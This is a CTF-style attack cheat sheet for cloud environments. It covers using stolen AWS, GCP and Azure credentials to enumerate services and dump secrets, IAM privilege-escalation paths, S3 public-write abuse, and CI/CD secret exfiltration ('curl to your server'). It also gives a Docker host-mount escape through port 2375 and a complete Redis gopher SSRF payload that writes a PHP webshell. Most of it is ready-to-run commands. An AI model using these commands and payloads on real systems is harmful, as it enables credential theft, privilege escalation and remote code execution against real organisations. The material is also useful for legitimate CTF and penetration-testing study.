# Cloud & AWS — Beyond Metadata SSRF

Upstream covers metadata SSRF (ctf-web). This covers what to do with the creds and other cloud-native bugs.

## AWS — after you get creds (from SSRF, .env, CI logs, S3)

```bash
aws configure set aws_access_key_id <AKIA...>
aws configure set aws_secret_access_key <...>
aws configure set region us-east-1
aws sts get-caller-identity                 # ALWAYS first — shows role/user + arn
```

Enumerate by service:
```bash
aws s3 ls ; aws s3 ls s3://<bucket> ; aws s3 cp s3://<bucket>/flag.txt .
aws s3api list-object-versions --bucket <b> # deleted flags in old versions
aws iam list-users ; aws iam list-roles
aws iam list-attached-user-policies --user-name <u> ; aws iam get-policy-version ...
aws secretsmanager list-secrets ; aws secretsmanager get-secret-value --secret-id <s>
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws lambda list-functions ; aws lambda get-function --function-name <f>  # env vars + code URL
aws ecr describe-repositories ; aws ecr get-login-password  # pull private images
aws logs describe-log-groups ; aws logs tail <group>         # secrets in logs
aws ec2 describe-instances --query 'Instances[].{ip:PublicIpAddress,role:IamInstanceProfile}'
```

Privilege-escalation paths (iam:PassRole + lambda/ecs/ec2 = game over):
```
iam:CreatePolicyVersion / iam:AttachUserPolicy  -> self-escalate to AdministratorAccess
lambda:CreateFunction + iam:PassRole            -> lambda with role creds, exfil
ec2:RunInstances + iam:PassRole                 -> instance with admin profile
ssm:SendCommand                                 -> run commands fleet-wide
cloudformation + PassRole                       -> template executes with role
```

## S3 quick hits

```bash
# Public read
aws s3 ls s3://bucket --no-sign-request
curl https://bucket.s3.amazonaws.com/           # XML listing
# Public write (website deface / drop file):
echo test > f && aws s3 cp f s3://bucket/ --no-sign-request
# Bucket takeover / subdomain to S3: dangling CNAME -> claim bucket
```

## GCP

```bash
gcloud auth activate-service-account --key-file=key.json
gcloud projects list ; gcloud iam roles list
# Secrets: gcloud secrets list ; gcloud secrets versions access latest --secret=x
# Compute metadata (SSRF): needs header Metadata-Flavor: Google
# Artifact Registry: gcloud artifacts docker images list
```

## Azure

```bash
az login --service-principal -u <id> -p <secret> --tenant <tid>
az account list ; az keyvault secret list ; az webapp config appsettings list
# Managed identity from SSRF: GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## CI/CD exploitation (chains beyond upstream auth-infra)

```
GitHub Actions:
- pull_request_target + checkout of PR head -> any PR runs with base secrets
- GITHUB_TOKEN -> open PR in same repo (write) -> self-trigger workflow
- secrets exfil: curl to your server inside the workflow step
- fork-internal: self-hosted runners = host RCE
GitLab CI:
- shared runner + .gitlab-ci.yml injection on any branch push
- CI_JOB_TOKEN -> clone other internal repos
- runner escape: privileged docker executor
Docker/K8s (see also upstream games-and-vms-3):
- 2375 exposed: docker -H tcp://host:2375 run -v /:/mnt alpine
- serviceaccount token: /var/run/secrets/kubernetes.io/serviceaccount/token
  -> kubectl auth can-i --list -> exec pods / read secrets
```

## gopher:// chains (SSRF -> internal service RCE)

```
Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a\n\n<?php system($_GET[0]);?>\n\n%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
   -> writes webshell via redis config set dir + save
FastCGI: gopher://127.0.0.1:9000/ + fastcgi protocol payload (use Gopherus tool to generate)
gopherus --exploit fastcgi / redis / mysql / smtp
```

Tool for generating gopher payloads: `git clone https://github.com/tarunkant/Gopherus`

## Cloud checklist

```
[ ] creds validated (sts get-caller-identity)
[ ] every service enumerated for the role
[ ] secretsmanager + ssm + env vars + logs grepped
[ ] privesc path checked (PassRole / policy edit)
[ ] versioning on buckets (deleted flag recovery)
[ ] CI files read for chained tokens
```
